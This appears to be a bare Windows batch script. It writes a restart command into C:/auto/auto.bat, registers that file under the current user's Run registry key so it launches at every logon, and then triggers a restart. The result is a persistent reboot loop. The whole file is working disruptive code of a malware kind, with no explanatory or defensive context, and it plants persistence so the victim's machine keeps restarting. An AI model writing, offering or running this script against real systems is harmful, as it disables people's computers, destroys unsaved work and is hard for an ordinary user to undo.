@echo off

md "C:/auto"
echo shutdown -r -t 60 > C:/auto/auto.bat

@reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "auto" /t REG_SZ /d "C:/auto/auto.bat"

shutdown -r -t 60